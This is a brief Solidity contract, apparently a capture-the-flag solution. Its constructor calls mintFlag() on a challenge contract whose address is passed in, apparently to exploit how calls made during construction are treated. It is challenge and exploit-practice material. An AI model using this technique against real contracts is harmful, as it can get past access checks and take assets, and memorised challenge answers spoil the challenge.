// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./IChallenge3.sol";

contract Solver3 {
    constructor(address _target) {
        IChallenge3(_target).mintFlag();
    }
}
